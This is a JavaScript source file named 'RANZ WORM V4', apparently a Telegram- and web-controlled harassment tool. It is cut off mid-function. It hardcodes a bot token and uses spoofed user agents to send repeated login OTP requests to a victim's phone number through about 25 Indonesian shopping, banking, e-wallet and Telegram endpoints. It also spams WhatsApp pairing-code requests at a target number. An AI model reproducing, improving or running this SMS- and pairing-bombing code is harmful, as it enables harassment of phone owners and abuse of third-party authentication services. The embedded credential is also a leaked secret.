// =============================================
// RANZ WORM V4 - 100% ANTI ERROR SYSTEM
// Engineered by Ranzkecebet
// =============================================

'use strict';

// =============================================
// GLOBAL ERROR HANDLERS
// =============================================
process.on('uncaughtException', (err) => {
    console.error('\x1b[41m\x1b[37m[UNCAUGHT EXCEPTION]\x1b[0m', err.message);
    console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[41m\x1b[37m[UNHANDLED REJECTION]\x1b[0m', reason?.message || reason);
});

process.on('warning', (warning) => {
    if (warning.name === 'DeprecationWarning') return;
    console.warn('\x1b[43m\x1b[30m[WARNING]\x1b[0m', warning.message);
});

process.on('SIGINT', async () => {
    console.log('\n\x1b[33m[!] Graceful shutdown...\x1b[0m');
    try { if (global.bot) await global.bot.stopPolling(); } catch(e) {}
    try { if (global.server) global.server.close(); } catch(e) {}
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n\x1b[33m[!] SIGTERM received. Shutting down...\x1b[0m');
    process.exit(0);
});

// =============================================
// SAFE REQUIRE WITH FALLBACK
// =============================================
function safeRequire(moduleName, fallback = null) {
    try {
        return require(moduleName);
    } catch (err) {
        console.warn(`\x1b[33m[WARN] Module "${moduleName}" not found. Using fallback.\x1b[0m`);
        return fallback;
    }
}

const express = safeRequire('express', function() { return { use: () => {}, get: () => {}, post: () => {}, listen: () => {} }; });
const bodyParser = safeRequire('body-parser', { urlencoded: () => (req, res, next) => next(), json: () => (req, res, next) => next() });
const cookieParser = safeRequire('cookie-parser', () => (req, res, next) => next());
const TelegramBot = safeRequire('node-telegram-bot-api', class { constructor() {} on() {} onText() {} sendMessage() {} });
const axios = safeRequire('axios', { get: async () => ({ data: null }), post: async () => ({ data: null }) });
const moment = safeRequire('moment', () => ({ format: () => new Date().toISOString() }));
const geoip = safeRequire('geoip-lite', { lookup: () => null });
const fs = safeRequire('fs');
const path = safeRequire('path');
const crypto = safeRequire('crypto');
const pino = safeRequire('pino', () => ({ level: 'silent' }));
const QRCode = safeRequire('qrcode', { toDataURL: async () => '' });

let makeWASocket, useMultiFileAuthState, fetchLatestWaWebVersion, DisconnectReason;
try {
    const baileys = require('@whiskeysockets/baileys');
    makeWASocket = baileys.makeWASocket;
    useMultiFileAuthState = baileys.useMultiFileAuthState;
    fetchLatestWaWebVersion = baileys.fetchLatestWaWebVersion;
    DisconnectReason = baileys.DisconnectReason;
} catch (err) {
    console.warn('\x1b[33m[WARN] Baileys not available. WhatsApp features disabled.\x1b[0m');
    makeWASocket = () => ({ ev: { on: () => {} } });
    useMultiFileAuthState = async () => ({ state: {}, saveCreds: () => {} });
    fetchLatestWaWebVersion = async () => ({ version: [2, 3000, 0] });
    DisconnectReason = { loggedOut: 'loggedOut', restartRequired: 'restartRequired', timedOut: 'timedOut', connectionLost: 'connectionLost' };
}

// =============================================
// CONSTANTS & CONFIG
// =============================================
const CONFIG = {
    PORT: parseInt(process.env.PORT) || 3000,
    BOT_TOKEN: process.env.BOT_TOKEN || '8650738683:AAGwbBb5oDu0pCOh3ptfZAsoLnDeSmORvLU',
    OWNER_ID: parseInt(process.env.OWNER_ID) || 1402999777,
    SESSIONS_DIR: path.join(__dirname, 'sessions'),
    USERS_FILE: path.join(__dirname, 'data', 'users.json'),
    LOG_FILE: path.join(__dirname, 'data', 'server.log'),
    PENDING_FILE: path.join(__dirname, 'data', 'pending.json'),
    USER_SESSIONS_FILE: path.join(__dirname, 'data', 'user_sessions.json'),
    MAX_OTP_COUNT: 50,
    MAX_PAIRING_COUNT: 50,
    REQUEST_TIMEOUT: 15000,
    RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 2000
};

// =============================================
// SAFE FILE SYSTEM OPERATIONS
// =============================================
function ensureDirectory(dirPath) {
    try {
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }
        return true;
    } catch (err) {
        console.error(`\x1b[31m[ERROR] Cannot create directory: ${dirPath}\x1b[0m`);
        return false;
    }
}

function safeReadJSON(filePath, defaultValue = {}) {
    try {
        if (!fs.existsSync(filePath)) {
            safeWriteJSON(filePath, defaultValue);
            return JSON.parse(JSON.stringify(defaultValue));
        }
        const data = fs.readFileSync(filePath, 'utf8');
        if (!data || data.trim() === '') {
            safeWriteJSON(filePath, defaultValue);
            return JSON.parse(JSON.stringify(defaultValue));
        }
        return JSON.parse(data);
    } catch (err) {
        console.error(`\x1b[31m[ERROR] Failed to read ${filePath}: ${err.message}\x1b[0m`);
        try { safeWriteJSON(filePath, defaultValue); } catch(e) {}
        return JSON.parse(JSON.stringify(defaultValue));
    }
}

function safeWriteJSON(filePath, data) {
    try {
        const dir = path.dirname(filePath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
        return true;
    } catch (err) {
        console.error(`\x1b[31m[ERROR] Failed to write ${filePath}: ${err.message}\x1b[0m`);
        return false;
    }
}

function safeAppendFile(filePath, content) {
    try {
        const dir = path.dirname(filePath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.appendFileSync(filePath, content, 'utf8');
        return true;
    } catch (err) {
        console.error(`\x1b[31m[ERROR] Failed to append ${filePath}: ${err.message}\x1b[0m`);
        return false;
    }
}

function safeDeleteDir(dirPath) {
    try {
        if (fs.existsSync(dirPath)) {
            fs.rmSync(dirPath, { recursive: true, force: true });
        }
        return true;
    } catch (err) {
        console.error(`\x1b[31m[ERROR] Failed to delete ${dirPath}: ${err.message}\x1b[0m`);
        return false;
    }
}

// =============================================
// INITIALIZE DIRECTORIES & FILES
// =============================================
ensureDirectory(CONFIG.SESSIONS_DIR);
ensureDirectory(path.join(__dirname, 'data'));

const DEFAULT_USERS = { users: [] };
const DEFAULT_PENDING = { pending: [] };
const DEFAULT_SESSIONS = {};

safeReadJSON(CONFIG.USERS_FILE, DEFAULT_USERS);
safeReadJSON(CONFIG.PENDING_FILE, DEFAULT_PENDING);
safeReadJSON(CONFIG.USER_SESSIONS_FILE, DEFAULT_SESSIONS);

// =============================================
// LOGGER
// =============================================
const Logger = {
    log: (message) => {
        const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
        const logEntry = `[${timestamp}] ${message}\n`;
        safeAppendFile(CONFIG.LOG_FILE, logEntry);
    },
    info: (message) => console.log(`\x1b[36m[INFO]\x1b[0m ${message}`),
    success: (message) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${message}`),
    warn: (message) => console.warn(`\x1b[33m[WARN]\x1b[0m ${message}`),
    error: (message) => console.error(`\x1b[31m[ERROR]\x1b[0m ${message}`),
    debug: (message) => process.env.DEBUG && console.log(`\x1b[35m[DEBUG]\x1b[0m ${message}`)
};

// =============================================
// SAFE WRAPPERS
// =============================================
function safeExecute(fn, fallbackValue = null, errorContext = 'Unknown') {
    try {
        return fn();
    } catch (err) {
        Logger.error(`${errorContext}: ${err.message}`);
        return fallbackValue;
    }
}

async function safeExecuteAsync(fn, fallbackValue = null, errorContext = 'Unknown') {
    try {
        return await fn();
    } catch (err) {
        Logger.error(`${errorContext}: ${err.message}`);
        return fallbackValue;
    }
}

function safeJSONParse(str, fallback = {}) {
    try {
        return JSON.parse(str);
    } catch (err) {
        return fallback;
    }
}

function safeStringify(obj, fallback = '{}') {
    try {
        return JSON.stringify(obj);
    } catch (err) {
        return fallback;
    }
}

// =============================================
// EXPRESS APP SETUP
// =============================================
const app = express();

// Safe middleware
app.use((req, res, next) => {
    try {
        bodyParser.urlencoded({ extended: true, limit: '10mb' })(req, res, (err) => {
            if (err) { Logger.error(`Body parse error: ${err.message}`); req.body = {}; }
            next();
        });
    } catch (err) {
        req.body = {};
        next();
    }
});

app.use((req, res, next) => {
    try {
        bodyParser.json({ limit: '10mb' })(req, res, (err) => {
            if (err) { Logger.error(`JSON parse error: ${err.message}`); req.body = {}; }
            next();
        });
    } catch (err) {
        req.body = {};
        next();
    }
});

app.use((req, res, next) => {
    try {
        cookieParser()(req, res, next);
    } catch (err) {
        next();
    }
});

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// =============================================
// HELPER FUNCTIONS
// =============================================
function getClientIP(req) {
    return safeExecute(() => {
        return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
               req.headers['x-real-ip'] ||
               req.headers['cf-connecting-ip'] ||
               req.connection?.remoteAddress ||
               req.socket?.remoteAddress ||
               'Unknown';
    }, 'Unknown', 'getClientIP');
}

function formatPhoneNumber(phone) {
    return safeExecute(() => {
        if (!phone || typeof phone !== 'string') return '62800000000';
        let cleaned = phone.replace(/[^0-9]/g, '');
        if (cleaned.length < 6) cleaned = '62800000000';
        if (cleaned.startsWith('0')) cleaned = '62' + cleaned.substring(1);
        if (!cleaned.startsWith('62')) cleaned = '62' + cleaned;
        return cleaned.substring(0, 15);
    }, '62800000000', 'formatPhoneNumber');
}

function generateOTP() {
    return safeExecute(() => Math.floor(100000 + Math.random() * 900000).toString(), '123456', 'generateOTP');
}

function generatePairingCode() {
    return safeExecute(() => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
        return code;
    }, 'ABCD1234', 'generatePairingCode');
}

// =============================================
// RETRY MECHANISM
// =============================================
async function withRetry(fn, maxRetries = CONFIG.RETRY_ATTEMPTS, delay = CONFIG.RETRY_DELAY, context = 'Unknown') {
    let lastError;
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            return await fn();
        } catch (err) {
            lastError = err;
            Logger.warn(`[${context}] Attempt ${attempt}/${maxRetries} failed: ${err.message}`);
            if (attempt < maxRetries) {
                await new Promise(resolve => setTimeout(resolve, delay * attempt));
            }
        }
    }
    throw lastError || new Error(`[${context}] All retries failed`);
}

// =============================================
// SPAM OTP - ROBUST WITH FALLBACKS
// =============================================
const OTP_APIS = {
    tokopedia: {
        name: 'Tokopedia',
        url: 'https://accounts.tokopedia.com/otp/cod',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://accounts.tokopedia.com/otp/cod',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
                'Origin': 'https://www.tokopedia.com'
            },
            data: JSON.stringify({ phone, type: 'login' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    shopee: {
        name: 'Shopee',
        url: 'https://shopee.co.id/api/v2/authentication/otp/send',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://shopee.co.id/api/v2/authentication/otp/send',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone_number: phone, operation: 'login' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    gojek: {
        name: 'Gojek',
        url: 'https://api.gojekapi.com/v3/customers/login_with_phone',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.gojekapi.com/v3/customers/login_with_phone',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Gojek/4.50.1 (Android 13)'
            },
            data: JSON.stringify({ phone, country_code: '+62' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    grab: {
        name: 'Grab',
        url: 'https://api.grab.com/grabid/v1/phone/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.grab.com/grabid/v1/phone/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Grab/5.200.0 (Android 13)'
            },
            data: JSON.stringify({ phone, country_code: 'ID', method: 'SMS' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    bukalapak: {
        name: 'Bukalapak',
        url: 'https://api.bukalapak.com/v2/authentications.json',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.bukalapak.com/v2/authentications.json',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone, action: 'login' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    traveloka: {
        name: 'Traveloka',
        url: 'https://www.traveloka.com/api/v2/authentication/otp/request',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://www.traveloka.com/api/v2/authentication/otp/request',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone, type: 'LOGIN' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    ovo: {
        name: 'OVO',
        url: 'https://api.ovo.id/v1.1/api/auth/customer/login2FA',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.ovo.id/v1.1/api/auth/customer/login2FA',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'OVO/3.80.0 (Android 13)'
            },
            data: JSON.stringify({ mobile: phone, deviceId: crypto.randomBytes(16).toString('hex') }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    dana: {
        name: 'DANA',
        url: 'https://api.dana.id/v1/auth/login',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.dana.id/v1/auth/login',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'DANA/4.20.0 (Android 13)'
            },
            data: JSON.stringify({ phone, type: 'SMS' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    linkaja: {
        name: 'LinkAja',
        url: 'https://api.linkaja.id/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.linkaja.id/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'LinkAja/3.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    akulaku: {
        name: 'Akulaku',
        url: 'https://api.akulaku.com/v1/user/sendOtp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.akulaku.com/v1/user/sendOtp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Akulaku/5.0.0 (Android 13)'
            },
            data: JSON.stringify({ mobile: phone, type: 1 }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    kredivo: {
        name: 'Kredivo',
        url: 'https://api.kredivo.com/v1/user/send_otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.kredivo.com/v1/user/send_otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Kredivo/3.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    rumah123: {
        name: 'Rumah123',
        url: 'https://www.rumah123.com/api/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://www.rumah123.com/api/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    olx: {
        name: 'OLX Indonesia',
        url: 'https://www.olx.co.id/api/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://www.olx.co.id/api/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone, type: 'sms' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    jdid: {
        name: 'JD.ID',
        url: 'https://api.jd.id/v1/auth/sendOtp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.jd.id/v1/auth/sendOtp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'JD.ID/4.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    blibli: {
        name: 'Blibli',
        url: 'https://www.blibli.com/backend/api/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://www.blibli.com/backend/api/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone, type: 'login' }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    zalora: {
        name: 'Zalora',
        url: 'https://www.zalora.co.id/api/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://www.zalora.co.id/api/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    sociolla: {
        name: 'Sociolla',
        url: 'https://api.sociolla.com/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.sociolla.com/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Sociolla/3.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    lazada: {
        name: 'Lazada',
        url: 'https://api.lazada.co.id/rest/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.lazada.co.id/rest/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    alfamart: {
        name: 'Alfamart',
        url: 'https://api.alfamart.com/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.alfamart.com/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Alfamart/3.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    indomaret: {
        name: 'Indomaret',
        url: 'https://api.indomaret.com/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.indomaret.com/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Indomaret/3.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    bca: {
        name: 'BCA Mobile',
        url: 'https://mobile.bca.co.id/api/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://mobile.bca.co.id/api/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'BCA/4.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    mandiri: {
        name: 'Mandiri Online',
        url: 'https://api.bankmandiri.co.id/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.bankmandiri.co.id/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mandiri/5.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    bni: {
        name: 'BNI Mobile',
        url: 'https://api.bni.co.id/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.bni.co.id/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'BNI/4.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    bri: {
        name: 'BRI Mobile',
        url: 'https://api.bri.co.id/v1/auth/otp',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://api.bri.co.id/v1/auth/otp',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'BRI/5.0.0 (Android 13)'
            },
            data: JSON.stringify({ phone }),
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    },
    telegram: {
        name: 'Telegram',
        url: 'https://my.telegram.org/auth/send_password',
        buildRequest: (phone) => ({
            method: 'POST',
            url: 'https://my.telegram.org/auth/send_password',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
                'Origin': 'https://my.telegram.org'
            },
            data: `phone=${phone}`,
            timeout: CONFIG.REQUEST_TIMEOUT,
            validateStatus: () => true
        })
    }
};

const FALLBACK_OTP_SERVICES = [
    { name: 'Generic SMS Gateway 1', url: 'https://textbelt.com/text' },
    { name: 'Generic SMS Gateway 2', url: 'https://api.twilio.com/2010-04-01/Accounts' },
    { name: 'Generic SMS Gateway 3', url: 'https://rest.nexmo.com/sms/json' }
];

async function sendOTPToService(serviceKey, phoneNumber) {
    const service = OTP_APIS[serviceKey];
    if (!service) {
        return { success: false, service: 'Unknown', statusCode: 0, message: 'Service not found' };
    }

    try {
        const requestConfig = service.buildRequest(phoneNumber);
        const response = await withRetry(
            () => axios(requestConfig),
            2,
            1000,
            `OTP-${service.name}`
        );

        const successIndicators = ['success', 'ok', 'otp', 'sent', 'kode', 'verifikasi', '200', '201', '202'];
        const responseStr = safeStringify(response.data).toLowerCase();
        const isSuccess = successIndicators.some(ind => responseStr.includes(ind)) ||
                          response.status === 200 || response.status === 201 ||
                          response.status === 202 || response.status === 429;

        return {
            success: isSuccess,
            service: service.name,
            statusCode: response.status,
            message: isSuccess ? 'OTP sent successfully' : 'Failed to send OTP'
        };
    } catch (err) {
        return {
            success: false,
            service: service.name,
            statusCode: 0,
            message: err.message || 'Unknown error'
        };
    }
}

async function spamOTPFull(target, count, eventCallback, username) {
    const phoneNumber = formatPhoneNumber(target);
    const serviceKeys = Object.keys(OTP_APIS);
    const results = [];
    const usedServices = new Set();

    try {
        eventCallback(username, {
            type: 'status', message: `Starting OTP spam to ${phoneNumber}...`,
            number: target, status: 'starting', progress: 5
        });
    } catch(e) {}

    for (let i = 0; i < count; i++) {
        try {
            let availableServices = serviceKeys.filter(k => !usedServices.has(k));
            if (availableServices.length === 0) {
                usedServices.clear();
                availableServices = serviceKeys;
            }

            const randomIndex = Math.floor(Math.random() * availableServices.length);
            const serviceKey = availableServices[randomIndex];
            usedServices.add(serviceKey);

            const progress = 10 + Math.floor(((i + 1) / count) * 85);

            try {
                eventCallback(username, {
                    type: 'status', message: `Sending OTP #${i+1} via ${OTP_APIS[serviceKey].name}...`,
                    number: target, status: 'sending', progress,
                    iteration: { current: i + 1, total: count },
                    service: OTP_APIS[serviceKey].name
                });
            } catch(e) {}

            Logger.info(`[OTP ${i+1}/${count}] ${OTP_APIS[serviceKey].name} -> ${phoneNumber}`);

            const result = await sendOTPToService(serviceKey, phoneNumber);

            const resultEntry = {
                number: i + 1,
                service: OTP_APIS[serviceKey].name,
                target: phoneNumber,
                status: result.success ? 'sent' : 'failed',
                statusCode: result.statusCode || 0,
                message: result.message || 'Unknown',
                time: moment().format('HH:mm:ss')
            };

            results.push(resultEntry);

            try {
                eventCallback(username, {
                    type: 'otp_result', message: `OTP #${i+1}: ${result.success ? 'Sent' : 'Failed'}`,
                    number: target, status: result.success ? 'sent' : 'failed',
                    result: resultEntry, progress,
                    iteration: { current: i + 1, total: count }
                });
            } catch(e) {}

            if (i < count - 1) {
                await new Promise(r => setTimeout(r, 1500 + Math.random() * 2500));
            }

        } catch (err) {
            Logger.error(`[OTP ${i+1}] Unexpected error: ${err.message}`);
            results.push({
                number: i + 1,
                service: 'Unknown',
                target: phoneNumber,
                status: 'error',
                statusCode: 0,
                message: err.message,
                time: moment().format('HH:mm:ss')
            });
        }
    }

    const successCount = results.filter(r => r.status === 'sent').length;

    try {
        eventCallback(username, {
            type: 'complete', message: `OTP spam complete! ${successCount}/${count} sent.`,
            number: target, status: 'complete', progress: 100,
            summary: { total: count, success: successCount, failed: count - successCount }
        });
    } catch(e) {}

    Logger.success(`[SPAM OTP DONE] ${successCount}/${count} sent to ${phoneNumber}`);
    Logger.log(`Spam OTP: ${phoneNumber} - ${successCount}/${count} by ${username}`);

    return results;
}

// =============================================
// SPAM PAIRING - ROBUST
// =============================================
async function spamPairingMultiple(username, targetNumber, count, eventCallback) {
    const results = [];
    const mainSessionDir = path.join(CONFIG.SESSIONS_DIR, `pairing_${targetNumber}_${Date.now()}`);

    if (!ensureDirectory(mainSessionDir)) {
        try { eventCallback(username, { type: 'error', message: 'Failed to create session directory' }); } catch(e) {}
        return results;
    }

    try {
        eventCallback(username, {
            type: 'status', message: `Starting ${count} pairing spam...`,
            number: targetNumber, status: 'starting', progress: 10
        });
    } catch(e) {}

    for (let i = 0; i < count; i++) {
        try {
            const currentProgress = 10 + Math.floor(((i + 1) / count) * 85);
            const iterationDir = path.join(mainSessionDir, `iter_${i + 1}`);

            if (!ensureDirectory(iterationDir)) continue;

            try {
                eventCallback(username, {
                    type: 'status', message: `Pairing request #${i+1}/${count}...`,
                    number: targetNumber, status: 'processing', progress: currentProgress,
                    iteration: { current: i+1, total: count }
                });
            } catch(e) {}

            const { state } = await useMultiFileAuthState(iterationDir);
            const { version } = await fetchLatestWaWebVersion();

            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: pino({ level: "silent" }),
                version: version,
                defaultQueryTimeoutMs: 30000,
                connectTimeoutMs: 30000,
                keepAliveIntervalMs: 5000,
                generateHighQualityLinkPreview: false,
                syncFullHistory: false,
                fireInitQueries: false,
                markOnlineOnConnect: false
            });

            const pairingResult = await new Promise((resolve) => {
                let resolved = false;
                const timeout = setTimeout(() => {
                    if (!resolved) { resolved = true; resolve({ status: 'timeout', code: null }); }
                }, 25000);

                sock.ev.on("connection.update", async (update) => {
                    if (resolved) return;
                    const { connection } = update;

                    if (connection === "connecting" && !resolved) {
                        try {
                            const code = await sock.requestPairingCode(targetNumber);
                            if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ status: 'success', code }); }
                        } catch (err) {
                            if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ status: 'error', code: null, error: err.message }); }
                        }
                    }

                    if (connection === "close" && !resolved) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve({ status: 'closed', code: null });
                    }

                    if (connection === "open" && !resolved) {
                        resolved = true;
                        clearTimeout(timeout);
                        resolve({ status: 'connected', code: null });
                    }
                });
            });

            const formattedCode = pairingResult.code ?
                pairingResult.code.match(/.{1,4}/g)?.join('-') || pairingResult.code :
                'N/A';

            const resultEntry = {
                number: i + 1,
                code: formattedCode,
                rawCode: pairingResult.code,
                target: targetNumber,
                status: pairingResult.status === 'success' ? 'sent' : pairingResult.status,
                time: moment().format('HH:mm:ss')
            };

            results.push(resultEntry);

            try {
                eventCallback(username, {
                    type: 'pairing_result', message: `Pairing #${i+1}: ${formattedCode}`,
                    number: targetNumber, status: resultEntry.status,
                    result: resultEntry, progress: currentProgress + 1,
                    iteration: { current: i+1, total: count }
                });
            } catch(e) {}

            try { sock.end(); } catch(e) {}

            if (i < count - 1) {
                await new Promise(r => setTimeout(r, 2000 + Math.random() * 3000));
            }

        } catch (err) {
            Logger.error(`[PAIRING ${i+1}] Error: ${err.message}`);
            results.push({
                number: i + 1,
                code: 'ERROR',
                target: targetNumber,
                status: 'error',
                time: moment().format('HH:mm:ss'),
                error: err.message
            });
        }
    }

    safeDeleteDir(mainSessionDir);

    const successCount = results.filter(r => r.status === 'sent').length;

    try {
        eventCallback(username, {
            type: 'complete', message: `Pairing spam complete! ${successCount}/${count} success.`,
            number: targetNumber, status: 'complete', progress: 100,
            summary: { total: count, success: successCount, failed: count - successCount }
        });
    } catch(e) {}

    return results;
}

// =============================================
// WHATSAPP CONNECT - ROBUST
// =============================================
async function connectToWhatsAppUser(username, BotNumber, sessionDir, eventCallback) {
    try {
        try { eventCallback(username, { type: 'status', message: 'Starting WhatsApp connection...', number: BotNumber, status: 'connecting', progress: 10 }); } catch(e) {}

        if (!ensureDirectory(sessionDir)) {
            throw new Error('Failed to create session directory');
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestWaWebVersion();

        try { eventCallback(username, { type: 'status', message: 'Creating socket...', number: BotNumber, status: 'connecting', progress: 25 }); } catch(e) {}

        const userSock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            version: version,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000,
            generateHighQualityLinkPreview: true,
            syncFullHistory: false,
            retryRequestDelayMs: 2000,
            fireInitQueries: true,
            markOnlineOnConnect: false
        });

        return new Promise((resolve, reject) => {
            let isConnected = false;
            let pairingCodeGenerated = false;
            let connectionTimeout;
            let reconnectAttempts = 0;
            const MAX_RECONNECT_ATTEMPTS = 3;

            const cleanup = () => {
                if (connectionTimeout) clearTimeout(connectionTimeout);
            };

            userSock.ev.on("connection.update", async (update) => {
                try {
